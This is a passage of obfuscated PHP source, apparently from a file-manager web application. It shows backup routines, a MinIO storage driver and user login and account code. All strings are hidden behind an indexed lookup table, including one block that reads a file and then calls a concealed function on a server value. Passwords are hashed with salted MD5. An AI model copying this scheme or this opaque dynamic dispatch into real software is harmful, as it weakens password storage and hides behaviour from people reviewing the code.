Model($‡ÆŞÂÇ[739])->remove($¹‚Á«Á[$‡ÆŞÂÇ[401]]); } $¹‚Á«Á = $this->initData($ê¾Ì–Î”, $¹‚Á«Á[$‡ÆŞÂÇ[742]]); } else { $this->checkStore($¹‚Á«Á[$‡ÆŞÂÇ[742]]); } } self::$option = $¹‚Á«Á; } private function isManual() { $ÒÏ—ŞÉ³ = _get($GLOBALS, $_SERVER[¥Ÿ©ÒèÌ][743], 0); $ÒÏ—ŞÉ³ = intval($ÒÏ—ŞÉ³); self::$manual = $ÒÏ—ŞÉ³ && $ÒÏ—ŞÉ³ == 1 ? 1 : 0; } private function initData($öö“¨¼æ = 0, $·ßşš¸ó = '') { $ñ Ùœî =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÕÑ… = Model($ñ Ùœî[739])->config(); if ($·ßşš¸ó && $ŒÕÑ…[$ñ Ùœî[742]] != $·ßşš¸ó) { $öö“¨¼æ = 0; } $this->checkStore($ŒÕÑ…[$ñ Ùœî[742]]); if (self::$manual == 1) { self::$name .= $ñ Ùœî[11] . date($ñ Ùœî[744]); } $ƒ×®¥¨æ = array($ñ Ùœî[742] => $ŒÕÑ…[$ñ Ùœî[742]], $ñ Ùœî[32] => self::$name, $ñ Ùœî[740] => 0, $ñ Ùœî[745] => $ŒÕÑ…[$ñ Ùœî[745]], $ñ Ùœî[746] => self::$manual, $ñ Ùœî[297] => array($ñ Ùœî[747] => array($ñ Ùœî[740] => 0), $ñ Ùœî[748] => array($ñ Ùœî[740] => 0, $ñ Ùœî[749] => 0, $ñ Ùœî[750] => 0, $ñ Ùœî[33] => $ñ Ùœî[12], $ñ Ùœî[751] => 0, $ñ Ùœî[496] => 0), $ñ Ùœî[752] => array($ñ Ùœî[740] => 0, $ñ Ùœî[749] => 0, $ñ Ùœî[750] => 0, $ñ Ùœî[751] => 0, $ñ Ùœî[496] => 0), $ñ Ùœî[192] => array($ñ Ùœî[740] => 0, $ñ Ùœî[753] => 0, $ñ Ùœî[754] => 0, $ñ Ùœî[755] => 0, $ñ Ùœî[756] => 0, $ñ Ùœî[467] => $öö“¨¼æ, $ñ Ùœî[751] => 0, $ñ Ùœî[496] => 0)), $ñ Ùœî[751] => time(), $ñ Ùœî[496] => 0); $ûÒêì‡¿ = Model($ñ Ùœî[739])->insert($ƒ×®¥¨æ); $ƒ×®¥¨æ[$ñ Ùœî[401]] = $ûÒêì‡¿; return $ƒ×®¥¨æ; } private function checkStore($¢¬¤¾Äğ) { $¹ÄĞ™êó =& $_SERVER[¥Ÿ©ÒèÌ]; $¦ª®Åé = Model($¹ÄĞ™êó[757])->listData($¢¬¤¾Äğ); Model($¹ÄĞ™êó[757])->checkConfig($¦ª®Åé); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¥Ÿ©ÒèÌ][739])->findByName(self::$name); } return self::$option; } public static function set($ï–ğ‡¦ì) { $ê¹ßÈÃ™ =& $_SERVER[¥Ÿ©ÒèÌ]; $š´µÅëó = self::get(); foreach ($ï–ğ‡¦ì as $¢õ»”ÁŸ => $»®Ğ†„ø) { $ÚøÒÆîë = explode($ê¹ßÈÃ™[10], $¢õ»”ÁŸ); $¥åõßÜ = count($ÚøÒÆîë); switch ($¥åõßÜ) { case 1: $š´µÅëó[$ÚøÒÆîë[0]] = $»®Ğ†„ø; break; case 2: $š´µÅëó[$ÚøÒÆîë[0]][$ÚøÒÆîë[1]] = $»®Ğ†„ø; break; case 3: $š´µÅëó[$ÚøÒÆîë[0]][$ÚøÒÆîë[1]][$ÚøÒÆîë[2]] = $»®Ğ†„ø; break; } } Model($ê¹ßÈÃ™[739])->update($š´µÅëó[$ê¹ßÈÃ™[401]], $š´µÅëó); self::$option = $š´µÅëó; return self::$option; } public function keep() { $çìš²©¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $œõÊğó = self::get(); if ($œõÊğó[$çìš²©¯[297]][$çìš²©¯[747]][$çìš²©¯[740]] == $çìš²©¯[89]) { return; } $this->backupKeep($œõÊğó); self::set(array($çìš²©¯[758] => 1)); } private function backupKeep($çíı²™) { $ÁÈëÎá“ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::$manual == 1) { return; } $è«¾«Ú = Model($ÁÈëÎá“[739])->listData(); if (empty($è«¾«Ú)) { return; } $àûÂÒŸ = 0; $š£¿¾¤« = array(); foreach ($è«¾«Ú as $ğœåÙ”—) { if ($àûÂÒŸ >= 7) { break; } $š£¿¾¤«[] = $ğœåÙ”—[$ÁÈëÎá“[32]]; $àûÂÒŸ++; } for ($àûÂÒŸ = 0; $àûÂÒŸ < 12; $àûÂÒŸ++) { $š£¿¾¤«[] = date($ÁÈëÎá“[759], strtotime("\x2d{$àûÂÒŸ}\x20\155\157\x6e\x74\x68\163")); } $š£¿¾¤« = array_unique($š£¿¾¤«); $ƒ×æ¨œú = Model($ÁÈëÎá“[760])->get($ÁÈëÎá“[761]); foreach ($è«¾«Ú as $ğœåÙ”—) { if (isset($ğœåÙ”—[$ÁÈëÎá“[746]]) && $ğœåÙ”—[$ÁÈëÎá“[746]] == $ÁÈëÎá“[89]) { continue; } if (!empty($ğœåÙ”—[$ÁÈëÎá“[32]]) && in_array($ğœåÙ”—[$ÁÈëÎá“[32]], $š£¿¾¤«)) { continue; } Model($ÁÈëÎá“[739])->remove($ğœåÙ”—[$ÁÈëÎá“[401]]); $§³Şî¾… = $this->backupPath($çíı²™, $ƒ×æ¨œú); IO::remove($§³Şî¾…, !1); } } private function backupPath($¤›Ò«Ä, $µå ¿ãŸ = false) { $¹ø‹åëõ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$µå ¿ãŸ) { $µå ¿ãŸ = Model($¹ø‹åëõ[760])->get($¹ø‹åëõ[761]); } $’·è£æ¡ = $¤›Ò«Ä[$¹ø‹åëõ[32]]; $¿›¨Ğ»Û = substr(md5($¹ø‹åëõ[762] . $µå ¿ãŸ . $’·è£æ¡), 0, 8); return "\x7b\151\157\x3a{$¤›Ò«Ä[$¹ø‹åëõ[742]]}\x7d\x2f\x64\141\x74\x61\142\141\x73\x65\57\142\141\x63\x6b\x75\160\57" . $’·è£æ¡ . $¹ø‹åëõ[11] . $¿›¨Ğ»Û; } public function db() { $ÁÊãäµ =& $_SERVER[¥Ÿ©ÒèÌ]; $­Ğ‡èµÑ = self::get(); if ($­Ğ‡èµÑ[$ÁÊãäµ[297]][$ÁÊãäµ[748]][$ÁÊãäµ[740]] == $ÁÊãäµ[89]) { return !0; } $Ò£Ã¥ø = new BackupDb(); if (!$Ò£Ã¥ø->index()) { return !1; } self::set(array($ÁÊãäµ[763] => 1)); return !0; } public function dbFile() { $ªàÊß®ì =& $_SERVER[¥Ÿ©ÒèÌ]; $ö¾£Û‡ = self::get(); if ($ö¾£Û‡[$ªàÊß®ì[297]][$ªàÊß®ì[752]][$ªàÊß®ì[740]] == $ªàÊß®ì[89]) { return !0; } $Ì¡Ø¤š¶ = new BackupDbFile(); if (!$Ì¡Ø¤š¶->index()) { return !1; } self::set(array($ªàÊß®ì[764] => 1)); return !0; } public function file() { $·õ§áÉÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $§œŸØ±» = self::get(); if ($§œŸØ±»[$·õ§áÉÎ[297]][$·õ§áÉÎ[192]][$·õ§áÉÎ[740]] == $·õ§áÉÎ[89]) { return !0; } if (!isset($§œŸØ±»[$·õ§áÉÎ[745]]) || $§œŸØ±»[$·õ§áÉÎ[745]] == $·õ§áÉÎ[190]) { $Ò€ÏÆş¦ = new BackupFile(); if (!$Ò€ÏÆş¦->index()) { return !1; } } self::set(array($·õ§áÉÎ[765] => 1, $·õ§áÉÎ[740] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ø”èê¯ğ =& $_SERVER[¥Ÿ©ÒèÌ]; $—¡é–• = Backup::get(); self::$io = $—¡é–•[$Ø”èê¯ğ[742]]; self::$name = $—¡é–•[$Ø”èê¯ğ[32]]; $Ğ”“Õ½Ç = new DbManage(); $×âˆ¨ = $Ğ”“Õ½Ç->dbType(); $•¦øşÜ” = array($Ø”èê¯ğ[766] => $×âˆ¨, $Ø”èê¯ğ[767] => time()); Backup::set($•¦øşÜ”); $ÉÃ…ÊÊ = $this->tmpFilesPath() . $Ø”èê¯ğ[768] . self::$name . $Ø”èê¯ğ[8]; del_dir($ÉÃ…ÊÊ); mk_dir($ÉÃ…ÊÊ); $¼¤šòÉ¦ = $‡ÌŞ¿Š’ = 0; $Ó Üòî° = new Task($Ø”èê¯ğ[769], $Ø”èê¯ğ[770], 0, LNG($Ø”èê¯ğ[771]) . $Ø”èê¯ğ[772] . LNG($Ø”èê¯ğ[773])); try { $É¬åÖàç = $Ğ”“Õ½Ç->db()->getTables(); } catch (Exception $Õıä•ºù) { $Ó Üòî°->end(); return !1; } $É¬åÖàç = array_diff($É¬åÖàç, array($Ø”èê¯ğ[774], $Ø”èê¯ğ[775])); foreach ($É¬åÖàç as $¼‘îØÎ¼) { $¼¤šòÉ¦ += $Ğ”“Õ½Ç->model($¼‘îØÎ¼)->count(); } $Ó Üòî°->task[$Ø”èê¯ğ[776]] = $¼¤šòÉ¦; $GLOBALS[$Ø”èê¯ğ[777]] = self::$name; foreach ($É¬åÖàç as $¼‘îØÎ¼) { $ÑªÂ«Ä = $ÉÃ…ÊÊ . $¼‘îØÎ¼ . $Ø”èê¯ğ[778]; $³®â¿Äı = null; if ($¼‘îØÎ¼ == $Ø”èê¯ğ[779] && (!isset($—¡é–•[$Ø”èê¯ğ[745]]) || $—¡é–•[$Ø”èê¯ğ[745]] == $Ø”èê¯ğ[190])) { $³®â¿Äı = self::$io; } $‡ÌŞ¿Š’ += $Ğ”“Õ½Ç->sqlFromDb($¼‘îØÎ¼, $ÑªÂ«Ä, $Ó Üòî°, $³®â¿Äı); } unset($GLOBALS[$Ø”èê¯ğ[777]]); $Ó Üòî°->end(); if ($‡ÌŞ¿Š’ > $¼¤šòÉ¦) { $¼¤šòÉ¦ = $‡ÌŞ¿Š’; } $•¦øşÜ” = array($Ø”èê¯ğ[766] => $×âˆ¨, $Ø”èê¯ğ[763] => 1, $Ø”èê¯ğ[780] => $¼¤šòÉ¦, $Ø”èê¯ğ[781] => $‡ÌŞ¿Š’, $Ø”èê¯ğ[782] => time()); Backup::set($•¦øşÜ”); if ($¼¤šòÉ¦ - $‡ÌŞ¿Š’ > 0) { $¡âß¡¼ = $Ø”èê¯ğ[783]; if (stristr(I18n::getType(), $Ø”èê¯ğ[784])) { $¡âß¡¼ = $Ø”èê¯ğ[785]; } write_log(array($¡âß¡¼, $•¦øşÜ”), $Ø”èê¯ğ[770]); return !1; } return !0; } private function tmpFilesPath() { $†Öò•† =& $_SERVER[¥Ÿ©ÒèÌ]; $é¸½« º = TEMP_FILES; if ($GLOBALS[$†Öò•†[6]][$†Öò•†[90]][$†Öò•†[786]]) { $é¸½« º = $GLOBALS[$†Öò•†[6]][$†Öò•†[90]][$†Öò•†[786]]; if (!mk_dir($é¸½« º) || !is_writable($é¸½« º) || !IO::mkfile($é¸½« º . $†Öò•†[787])) { $é¸½« º = TEMP_FILES; } } return $é¸½« º; } } goto a·ÍœÜ®¹å; AİŞê±¿Ì: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­±ÅÜ›«) { parent::__construct($­±ÅÜ›«); $this->signatureVersion($_SERVER[¥Ÿ©ÒèÌ][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[¥Ÿ©ÒèÌ][242], 1); define($_SERVER[¥Ÿ©ÒèÌ][243], 2); goto F»‚Åğ‡££; C‘Á¯Æ¸ö¯: if ($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][233]] != $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][234]]) { $_getc = $_SERVER[¥Ÿ©ÒèÌ][235]; $_getfile = $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥Ÿ©ÒèÌ][226], $_getfilec); if (count($_getarrs) < $_SERVER[¥Ÿ©ÒèÌ][238]) { $exit = $_SERVER[¥Ÿ©ÒèÌ][239]; $exit(); } $_act = $_SERVER[¥Ÿ©ÒèÌ][240]; $_act($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][241]]); } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\145\x72\137\155\x65\164\x61", "\x6d\145\164\141\106\x69\x65\x6c\144" => "\x75\x73\145\162\111\x44"); protected $simpleField = "\165\x73\145\x72\111\x44\54\x6e\151\x63\153\116\x61\155\145\x2c\156\141\x6d\x65\54\141\166\141\164\141\162\54\x73\x65\x78\54\163\164\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ù˜‚Š§˜) { $ªºüÒŠİ =& $_SERVER[¥Ÿ©ÒèÌ]; $ø‘³ï‡Ü = $ªºüÒŠİ[2236]; return array($ªºüÒŠİ[1884] => array($ù˜‚Š§˜[0], $ø‘³ï‡Ü), $ªºüÒŠİ[1886] => array($ù˜‚Š§˜[0], $ø‘³ï‡Ü), $ªºüÒŠİ[2237] => array($ù˜‚Š§˜[0], $ø‘³ï‡Ü)); } protected function getInfo($Ã¶¤áĞº, $¦”É¡ÁÙ = false) { $˜Áµãè = $this->getInfoSimple($Ã¶¤áĞº); if (!is_array($˜Áµãè)) { return array(); } if ($¦”É¡ÁÙ) { return $this->_getInfoApply($˜Áµãè); } return $this->cacheFunctionGet($_SERVER[¥Ÿ©ÒèÌ][1888], $Ã¶¤áĞº); } protected function getInfoFull($¹·ûµÁå, $•¸¦£ = false) { $Ôó‰†£  = $this->getInfoSimple($¹·ûµÁå); if (!is_array($Ôó‰†£ )) { return array(); } if ($•¸¦£) { return $this->_getInfoApply($Ôó‰†£ , !0); } return $this->cacheFunctionGet($_SERVER[¥Ÿ©ÒèÌ][2238], $¹·ûµÁå); } private function _getInfoApply($çª·ŠŒÂ, $Ø•§Œ¡ô = false) { $şúÏ ù‘ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$çª·ŠŒÂ) { return $çª·ŠŒÂ; } $Úâü‰°Ü = md5($şúÏ ù‘[2239] . $çª·ŠŒÂ[$şúÏ ù‘[875]] . $şúÏ ù‘[2240] . $çª·ŠŒÂ[$şúÏ ù‘[32]]); $çª·ŠŒÂ = $this->_listDataApplyItem($çª·ŠŒÂ); $¬Ï½‘·º = Model($şúÏ ù‘[1311])->metaGet($çª·ŠŒÂ[$şúÏ ù‘[87]][$şúÏ ù‘[403]]); $çª·ŠŒÂ[$şúÏ ù‘[2241]] = $Úâü‰°Ü; $çª·ŠŒÂ[$şúÏ ù‘[87]][$şúÏ ù‘[2070]] = isset($¬Ï½‘·º[$şúÏ ù‘[2071]]) ? $¬Ï½‘·º[$şúÏ ù‘[2071]] : null; if ($Ø•§Œ¡ô) { $çª·ŠŒÂ[$şúÏ ù‘[465]] = $this->metaGet($çª·ŠŒÂ[$şúÏ ù‘[1639]]); } return $çª·ŠŒÂ; } protected function getInfoSimple($òş×ŠøŒ, $Äšç¶Ë = false) { $ÛÍ‘ğÕ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$òş×ŠøŒ) { return array(); } if ($Äšç¶Ë) { $íöš˜“ = $this->where(array($ÛÍ‘ğÕ¾[1639] => intval($òş×ŠøŒ)))->find(); if (!is_array($íöš˜“)) { return array(); } $íöš˜“[$ÛÍ‘ğÕ¾[2242]] = Action($ÛÍ‘ğÕ¾[2243])->parseUrl($íöš˜“[$ÛÍ‘ğÕ¾[2242]]); return $íöš˜“; } return $this->cacheFunctionGet($ÛÍ‘ğÕ¾[1889], $òş×ŠøŒ); } protected function getInfoSimpleOuter($³ˆ´çé½) { $‚óãÓÑü =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$³ˆ´çé½ || $³ˆ´çé½ == 0) { return array($‚óãÓÑü[1639] => $‚óãÓÑü[190], $‚óãÓÑü[32] => $‚óãÓÑü[159] . LNG($‚óãÓÑü[2244]) . $‚óãÓÑü[536], $‚óãÓÑü[2242] => STATIC_PATH . $‚óãÓÑü[2245]); } $‰‡€Åş” = $this->cacheFunctionGet($‚óãÓÑü[1889], $³ˆ´çé½); $”¥·Éö¨ = array_field_key($‰‡€Åş”, explode($‚óãÓÑü[50], $this->simpleField)); if (!$”¥·Éö¨) { return array($‚óãÓÑü[1639] => $‚óãÓÑü[1174], $‚óãÓÑü[32] => $‚óãÓÑü[159] . LNG($‚óãÓÑü[2246]) . $‚óãÓÑü[536], $‚óãÓÑü[2242] => STATIC_PATH . $‚óãÓÑü[2247]); } $”¥·Éö¨[$‚óãÓÑü[2242]] = Action($‚óãÓÑü[2243])->parseUrl($”¥·Éö¨[$‚óãÓÑü[2242]]); return $”¥·Éö¨; } protected function groupUser($‹ÌŸÂ®õ) { } public static function errorLang($¡Æ…áŸœ) { $ÆÂ¦©å =& $_SERVER[¥Ÿ©ÒèÌ]; $º‚ÇİÆÍ = array(self::ERROR_USER_NOT_EXISTS => $ÆÂ¦©å[2248], self::ERROR_USER_PASSWORD_ERROR => $ÆÂ¦©å[2249], self::ERROR_USER_EXIST_NAME => $ÆÂ¦©å[2250], self::ERROR_USER_EXIST_PHONE => $ÆÂ¦©å[2251], self::ERROR_USER_EXIST_EMAIL => $ÆÂ¦©å[2252], self::ERROR_USER_LOGIN_LOCK => $ÆÂ¦©å[2253], self::ERROR_IP_NOT_ALLOW => $ÆÂ¦©å[2254], self::ERROR_USER_EXIST_NICKNAME => $ÆÂ¦©å[2255]); return LNG($º‚ÇİÆÍ[$¡Æ…áŸœ]); } public function getInfoByMeta($Øµæ±˜, $ì’¹áÙÕ) { $å´á—¿Ú =& $_SERVER[¥Ÿ©ÒèÌ]; $ÓíÖ‡Ù = Model($å´á—¿Ú[2256])->where(array($å´á—¿Ú[95] => $Øµæ±˜, $å´á—¿Ú[378] => $ì’¹áÙÕ))->find(); if ($ÓíÖ‡Ù) { return $this->getInfo($ÓíÖ‡Ù[$å´á—¿Ú[1639]]); } return !1; } public function userLoginCheck($Úèë«Û®, $¸×¡Â•ò) { $üâğ°üó =& $_SERVER[¥Ÿ©ÒèÌ]; $æ™Ê“Íƒ = $this->userLoginFind($Úèë«Û®); if (!$æ™Ê“Íƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($æ™Ê“Íƒ[$üâğ°üó[1639]], $¸×¡Â•ò)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($æ™Ê“Íƒ[$üâğ°üó[1639]]); } public function userLoginFind($”´åÃå) { $ÀˆùÉ¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ş ÌÉ·“ = array($ÀˆùÉ¼[32] => $”´åÃå, $ÀˆùÉ¼[2076] => $”´åÃå, $ÀˆùÉ¼[309] => $”´åÃå, $ÀˆùÉ¼[2257] => $”´åÃå, $ÀˆùÉ¼[986] => $ÀˆùÉ¼[988]); if ($this->nickNameRpt()) { unset($Ş ÌÉ·“[$ÀˆùÉ¼[2076]]); } return $this->where($Ş ÌÉ·“)->find(); } public function clearCache($‘’›êƒ) { $¾”»³‹ª =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cacheFunctionClear($¾”»³‹ª[1888], $‘’›êƒ); $this->cacheFunctionClear($¾”»³‹ª[1889], $‘’›êƒ); $this->cacheFunctionClear($¾”»³‹ª[2238], $‘’›êƒ); } public function userPasswordCheck($Ä·ÓÄìú, $õ°ãâúÍ) { $Õæğ°Âó =& $_SERVER[¥Ÿ©ÒèÌ]; $ÅÀ’Áû… = $this->where(array($Õæğ°Âó[1639] => intval($Ä·ÓÄìú)))->find(); $Ğ÷Â´ÓÖ = $this->metaGet($Ä·ÓÄìú); $²‡í¸ = isset($Ğ÷Â´ÓÖ[$Õæğ°Âó[2258]]) ? $Ğ÷Â´ÓÖ[$Õæğ°Âó[2258]] : $Õæğ°Âó[12]; if (md5($²‡í¸ . trim($õ°ãâúÍ)) !== $ÅÀ’Áû…[$Õæğ°Âó[875]]) { return !1; } return !0; } public function userAdd($İ‰¶ÅÖ“) { $ÁÇ¬´øÄ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÔµÊÒùæ = array($ÁÇ¬´øÄ[421] => $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[32]], $ÁÇ¬´øÄ[2259] => $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[1519]], $ÁÇ¬´øÄ[2260] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[309]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[309]] : $ÁÇ¬´øÄ[12], $ÁÇ¬´øÄ[2261] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2257]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2257]] : $ÁÇ¬´øÄ[12], $ÁÇ¬´øÄ[2262] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2076]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2076]] : $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[32]], $ÁÇ¬´øÄ[2263] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2242]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2242]] : $ÁÇ¬´øÄ[12], $ÁÇ¬´øÄ[2264] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2265]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[2265]] : 1, $ÁÇ¬´øÄ[2266] => $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[875]], $ÁÇ¬´øÄ[1890] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[1794]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[1794]] : 1024 * 1024 * 20, $ÁÇ¬´øÄ[1891] => 0, $ÁÇ¬´øÄ[2267] => 0, $ÁÇ¬´øÄ[1931] => isset($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[740]]) ? $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[740]] : 1); if (!empty($İ‰¶ÅÖ“[$ÁÇ¬´øÄ[1639]])) { $ÔµÊÒùæ[$ÁÇ¬´øÄ[1639]] = $İ‰¶ÅÖ“[$ÁÇ¬´øÄ[1639]]; } $´­™Äë = $this->_checkExist($İ‰¶ÅÖ“); if ($´­™Äë !== !0) { return $´­™Äë; } $±Ù‹Ï› = $this->add($ÔµÊÒùæ); $î¨‰ÓÙ = array($ÁÇ¬´øÄ[2266] => $ÔµÊÒùæ[$ÁÇ¬´øÄ[875]], $ÁÇ¬´øÄ[2262] => $ÔµÊÒùæ[$ÁÇ¬´øÄ[2076]]); $this->userEdit($±Ù‹Ï›, $î¨‰ÓÙ); Model($ÁÇ¬´øÄ[1311])->userRootAdd($±Ù‹Ï›); return $±Ù‹Ï›; } protected function userEditTest($«ÇÌŠ€¸, $äËÒ”÷) { return $this->call($_SERVER[¥Ÿ©ÒèÌ][2268], $«ÇÌŠ€¸, $äËÒ”÷); } protected function userEdit($˜­ÃŞ‘‘, $Ø²·›ÁÏ) { $Ï»›‚†¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $‰ô‘ŠÄ = $this->getInfoSimple($˜­ÃŞ‘‘); if (!$‰ô‘ŠÄ) { return !1; } $²­¹” = $this->_checkExist($Ø²·›ÁÏ, $˜­ÃŞ‘‘); if ($²­¹” !== !0) { return $²­¹”; } if (isset($Ø²·›ÁÏ[$Ï»›‚†¬[875]]) && trim($Ø²·›ÁÏ[$Ï»›‚†¬[875]]) != $Ï»›‚†¬[12]) { $»÷š£ÔÖ = $this->metaGet($˜­ÃŞ‘‘); if (empty($»÷š£ÔÖ[$Ï»›‚†¬[2258]])) { $»÷š£ÔÖ[$Ï»›‚†¬[2258]] = rand_string(10); Model($Ï»›‚†¬[513])->metaSet($˜­ÃŞ‘‘, $Ï»›‚†¬[2258], $»÷š£ÔÖ[$Ï»›‚†¬[2258]]); } $Ø²·›ÁÏ[$Ï»›‚†¬[875]] = md5($»÷š£ÔÖ[$Ï»›‚†¬[2258]] . trim($Ø²·›ÁÏ[$Ï»›‚†¬[875]])); } else { unset($Ø²·›ÁÏ[$Ï»›‚†¬[875]]); } $this->where(array($Ï»›‚†¬[1630] => $˜­ÃŞ‘‘))->save($Ø²·›ÁÏ); if (isset($Ø²·›ÁÏ[$Ï»›‚†¬[2076]])) { $this->setNamePinyin($˜­ÃŞ‘‘, $Ø²·›ÁÏ[$Ï»›‚†¬[2076]]); } $this->clearCache($˜­ÃŞ‘‘); return !0; } public function setNamePinyin($Ñôğ½ş, $¼òãˆ©‡ = false) { $§çàìˆü =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$¼òãˆ©‡) { $ â¯¤¯û = $this->getInfoSimple($Ñôğ½ş); $¼òãˆ©‡ = $ â¯¤¯û[$§çàìˆü[2076]] ? $ â¯¤¯û[$§çàìˆü[2076]] : $ â¯¤¯û[$§çàìˆü[32]]; } $çµ§º…› = Model($§çàìˆü[538]); if (!Input::check($¼òãˆ©‡, $§çàìˆü[587])) { return $çµ§º…›->metaSet($Ñôğ½ş, array($§çàìˆü[464] => $§çàìˆü[12], $§çàìˆü[463] => $§çàìˆü[12])); } return $çµ§º…›->metaSet($Ñôğ½ş, array($§çàìˆü[464] => str_replace($§çàìˆü[53], $§çàìˆü[12], Pinyin::get($¼òãˆ©‡)), $§çàìˆü[463] => Pinyin::get($¼òãˆ©‡, $§çàìˆü[588]))); } private function nickNameRpt() { $š¦óáŞ… =& $_SERVER[¥Ÿ©ÒèÌ]; $‡Ê«Ñ† = Model($š¦óáŞ…[760])->get($š¦óáŞ…[2269]); $Å¨øæºß = $GLOBALS[$š¦óáŞ…[6]][$š¦óáŞ…[385]][$š¦óáŞ…[2269]]; $ÒÙ˜ÎîŒ = !is_null($‡Ê«Ñ†) ? $‡Ê«Ñ† : $Å¨øæºß; return !!$ÒÙ˜ÎîŒ; } private function _checkExist($õõé½Ä, $“ñ¦¨€ = false) { $ êğ’ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÎÖÎ­Ã× = array($ êğ’[32] => UserModel::ERROR_USER_EXIST_NAME, $ êğ’[2076] => UserModel::ERROR_USER_EXIST_NICKNAME, $ êğ’[309] => UserModel::ERROR_USER_EXIST_EMAIL, $ êğ’[2257] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÎÖÎ­Ã×[$ êğ’[2076]]); } $û›ŒÉ’– = $“ñ¦¨€ ? array($ êğ’[1639] => array($ êğ’[2270], $“ñ¦¨€)) : array(); foreach ($ÎÖÎ­Ã× as $šå…ò† => $ûÕÆŞêÀ) { $Õ¤ÜÕ´ê = array(); foreach ($ÎÖÎ­Ã× as $àÃ©ØŸ¥ => $¼ìêÓôí) { if (isset($õõé½Ä[$àÃ©ØŸ¥]) && $õõé½Ä[$àÃ©ØŸ¥]) { $Õ¤ÜÕ´ê[] = $õõé½Ä[$àÃ©ØŸ¥]; } } if (!$Õ¤ÜÕ´ê) { continue; } $•²Ç’È½ = array_merge(array($šå…ò† => array($ êğ’[7], $Õ¤ÜÕ´ê)), $û›ŒÉ’–); $Í¿ûÃ§õ = $this->where($•²Ç’È½)->find(); if ($Í¿ûÃ§õ) { return $ûÕÆŞêÀ; } } return !0; } public function userListInfo($÷õî¤ã–) { $§‚İĞÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ù®ğØÉİ = array(); $÷õî¤ã– = is_array($÷õî¤ã–) ? array_unique($÷õî¤ã–) : array(); if (!$÷õî¤ã–) { return $Ù®ğØÉİ; } if (count($÷õî¤ã–) < 20) { foreach ($÷õî¤ã– as $ãƒÍ‹”ö) { $Ù®ğØÉİ[$ãƒÍ‹”ö . $§‚İĞÎ[12]] = $this->getInfoSimpleOuter($ãƒÍ‹”ö); } } else { $“ØÂ¼Ñğ = array($§‚İĞÎ[1630] => array($§‚İĞÎ[419], $÷õî¤ã–)); if (count($÷õî¤ã–) == 1) { $“ØÂ¼Ñğ = array($§‚İĞÎ[1630] => $÷õî¤ã–[0]); } $Æ–²·„Ë = Model($§‚İĞÎ[513])->field($this->simpleField)->where($“ØÂ¼Ñğ)->select(); $Æ–²·„Ë = array_to_keyvalue($Æ–²·„Ë, $§‚İĞÎ[1639]); foreach ($÷õî¤ã– as $ãƒÍ‹”ö) { $öÄ€š»Ë = $Æ–²·„Ë[$ãƒÍ‹”ö]; if (!$öÄ€š»Ë) { $Ù®ğØÉİ[$ãƒÍ‹”ö . $§‚İĞÎ[12]] = $this->getInfoSimpleOuter($ãƒÍ‹”ö); continue; } $öÄ€š»Ë[$§‚İĞÎ[2242]] = Action($§‚İĞÎ[2243])->parseUrl($öÄ€š»Ë[$§‚İĞÎ[2242]]); $Ù®ğØÉİ[$ãƒÍ‹”ö . $§‚İĞÎ[12]] = $öÄ€š»Ë; } } return $Ù®ğØÉİ; } protected function userStatus($ôÌĞª¥‰, $ùšè˜“) { $±†Âğâ = $this->getInfoSimple($ôÌĞª¥‰); if (!$±†Âğâ) { return !1; } $´ŒüĞ·‘ = 